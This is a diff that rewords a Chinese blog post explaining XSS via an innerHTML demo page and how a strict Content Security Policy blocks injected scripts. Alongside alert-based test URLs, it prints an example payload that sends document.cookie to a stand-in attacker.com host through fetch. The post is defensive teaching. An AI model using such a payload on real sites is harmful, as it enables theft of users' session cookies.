@@ -1,12 +1,13 @@
 ---
 title: CSP标头是什么？为什么有人能神不知鬼不觉地盗走你的信息？
 published: 2025-07-31
-description: 'CSP是内容安全策略，它可以防止攻击者向您的网站恶意注入脚本以盗走用户信息'
+description: 'CSP 是内容安全策略，它可以限制恶意脚本执行，从而降低 XSS 攻击带来的信息泄露风险'
 image: '../assets/images/e245d917-2255-4d2d-85fb-aa7538a18022.webp'
 tags: [XSS攻击, CSP]
 category: '记录'
 draft: false 
 lang: ''
+ai_level: 1
 ---
 > [!ai] gemini-3-flash-preview
 > 网站通过innerHTML直接插入未过滤的URL参数会导致XSS漏洞，攻击者可借此执行恶意脚本窃取Cookie等敏感信息。配置严格的Content Security Policy（CSP）策略（如`script-src 'self'`）能有效拦截未经授权的内联脚本执行，是预防此类攻击的核心技术手段。保障数据安全需站点部署严谨的CSP策略，并要求用户谨慎访问不明链接。
@@ -47,15 +48,15 @@ HTML内容为
 </html>
 ```
 
-这个网站非常简单，网页通过查询符 `?name=xxx` 来动态显示用户名
+这个网站非常简单：页面会通过查询参数 `?name=xxx` 动态显示用户名。
 
 比如你输入 https://none-csp-demo.pages.dev/nocsp?name=AcoFork 网页就会显示
 
 ![](../assets/images/366d0934-9c3a-4196-a7ae-1c230c916daf.webp)
 
-而根据源码 网页是通过 `innerHTML` 直接进行文本插入的
+从源码可以看出，这个网页是通过 `innerHTML` 直接插入文本内容的。
 
-这种方式没有任何的安全审查，会将传入的内容直接拼接到HTML中
+这种写法没有做任何安全处理，会把传入内容直接拼接进 HTML。
 
 那么...如果我们给网站这样一个 `name` 呢？
 
@@ -75,23 +76,23 @@ https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27
 
 被插入了一条 `<img src="x" onerror="alert('XSS攻击成功')">` ！
 
-也就是说，网页把我们传入的 `name` 并没有解析为纯文本
+也就是说，网页并没有把我们传入的 `name` 当作纯文本处理，
 
-而是暴力的直接插入了HTML
+而是直接把它插入成了 HTML。
 
-导致浏览器并没有渲染出来  `你好，<img src="x" onerror="alert('XSS攻击成功')"> ！` 
+因此浏览器并不会把它渲染成普通文字，例如 `你好，<img src="x" onerror="alert('XSS攻击成功')"> ！`
 
-而是直接将 `<img src="x" onerror="alert('XSS攻击成功')">` 作为HTML去执行了！
+而是会把 `<img src="x" onerror="alert('XSS攻击成功')">` 当作真正的 HTML 去执行。
 
-由于 `src=x` 必定无法获取，又因为设置了 `onerror` 这个回退源
+由于 `src=x` 一定无法成功加载，再加上元素设置了 `onerror` 回调，
 
-导致浏览器直接执行了 `alert('XSS攻击成功')` 这个脚本！
+浏览器就会直接执行 `alert('XSS攻击成功')` 这段脚本。
 
 # 有什么危害？
 
 举一反三，既然我们能让浏览器弹出一个提示框
 
-那也就能做到其他事情
+那么同理，它也能被用来做更多危险操作。
 
 攻击者完全可以伪造一条URL，然后发给你，比如**获取你的浏览器Cookie然后通过Fetch发送到指定的服务器**！！！
 `https://victim-site.com/page?name=<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">`
@@ -115,7 +116,7 @@ https://none-csp-demo.pages.dev/csp?name=%3Cimg%20src=x%20onerror=%22alert(%27XS
 **解释：**  
 你的 CSP 策略里规定只能加载本域（`'self'`）的脚本，但是你在 HTML 页面中写了 `<script>...</script>` 这样的**内联脚本**（inline script）。这被当前 CSP 限制了，无法执行。
 
-这样我们就成功避免了XSS攻击
+这样就能有效阻止这类 XSS 攻击继续执行。
 
 在HTML head中添加以下内容即可
 
@@ -132,6 +133,6 @@ https://none-csp-demo.pages.dev/csp?name=%3Cimg%20src=x%20onerror=%22alert(%27XS
 
 # 如何保证我的数据安全？
 
-1. 如果你正在运营站点，**请确保各个站点设置了严格的CSP策略**。这样，即使有攻击者想要XSS注入，也会被CSP策略拦截
+1. 如果你正在运营网站，**请尽量为站点设置严格的 CSP 策略**。这样即使页面存在 XSS 注入点，恶意脚本也更难真正执行。
 
-2. **不要随意点击来历不明的链接或扫描来历不明的二维码**。对于短链接、混淆后的链接，首先先解析出最终链接，评估风险后再访问。或者使用无痕模式访问。也许目标网站并没有严格的CSP策略，这可能会导致你的个人数据泄露
+2. **不要随意点击来历不明的链接或扫描来源不明的二维码**。对于短链接或混淆链接，建议先解析出最终地址并评估风险后再访问；如果不确定，也可以优先使用无痕模式打开。因为目标网站未必配置了严格的 CSP，这可能进一步增加个人数据泄露的风险。
